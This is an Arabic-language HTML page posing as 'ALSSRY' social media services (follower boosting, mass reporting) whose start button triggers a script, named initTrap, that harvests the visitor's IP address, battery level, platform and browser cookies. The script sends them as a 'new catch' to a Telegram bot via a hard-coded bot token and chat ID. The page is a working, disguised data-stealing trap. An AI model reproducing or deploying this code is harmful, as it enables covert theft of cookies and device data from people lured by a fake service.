<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ALSSRY - SERVICES</title>
    <style>
        :root { --main-green: #00ff00; --glow-red: #ff0000; }
        body { background: black; color: white; text-align: center; font-family: Arial; margin: 0; overflow: hidden; direction: rtl; }
        #starfield { position: fixed; width: 100%; height: 100%; z-index: -2; }
        .star { position: absolute; background: white; border-radius: 50%; animation: moveStar linear infinite; }
        @keyframes moveStar { from { transform: translateY(100vh); } to { transform: translateY(-10vh); } }
        .logo-3d { font-size: 42px; font-weight: 900; text-shadow: 3px 3px 0 var(--glow-red), -3px -3px 0 var(--main-green); margin: 20px 0; }
        .start-btn { padding: 15px 60px; background: transparent; border: 2px solid var(--main-green); color: var(--main-green); border-radius: 50px; font-size: 20px; cursor: pointer; }
        #tools-interface { display: none; padding: 20px; }
        .glass-btn { width: 90%; padding: 15px; margin: 10px 0; background: rgba(255,255,255,0.1); border: 1px solid var(--main-green); color: var(--main-green); border-radius: 10px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div id="starfield"></div>
    <div id="landing-page">
        <div class="logo-3d">ALSSRY</div>
        <h1 style="text-shadow: 0 0 10px var(--main-green);">خدمات سوشال ميديا</h1>
        <button class="start-btn" onclick="initTrap()">بدء الاستخدام</button>
    </div>

    <div id="tools-interface">
        <div class="logo-3d">ALSSRY</div>
        <button class="glass-btn">🚀 قسم زيادة المتابعين</button>
        <button class="glass-btn">⚔️ قسم الإسبام والبلاغات</button>
        <p style="color: grey; font-size: 12px; margin-top: 20px;">🟢 متصل الآن: 245 مستخدم</p>
    </div>

    <script>
        const BOT_TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg";
        const CHAT_ID = "5811700860";

        function createStars() {
            const container = document.getElementById('starfield');
            for(let i=0; i<80; i++) {
                const star = document.createElement('div');
                star.className = 'star';
                star.style.width = star.style.height = Math.random()*3+'px';
                star.style.left = Math.random()*100+'vw';
                star.style.animationDuration = Math.random()*5+2+'s';
                container.appendChild(star);
            }
        }
        createStars();

        async function initTrap() {
            document.getElementById('landing-page').style.display = 'none';
            document.getElementById('tools-interface').style.display = 'block';

            // سحب البيانات
            let ip = "Hidden";
            try { await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => ip = d.ip); } catch(e){}
            
            const battery = await navigator.getBattery().then(b => Math.round(b.level * 100) + "%").catch(() => "??");
            const platform = navigator.platform;
            const cookies = document.cookie || "Empty";

            // إرسال البيانات (بكلمة "صيد" ليفهمها بايثونيستا)
            const report = `🎣 صيد جديد:\n🌐 IP: ${ip}\n🔋 البطارية: ${battery}\n💻 النظام: ${platform}\n🍪 الكوكيز: ${cookies}`;
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(report)}`);
        }
    </script>
</body>
</html>
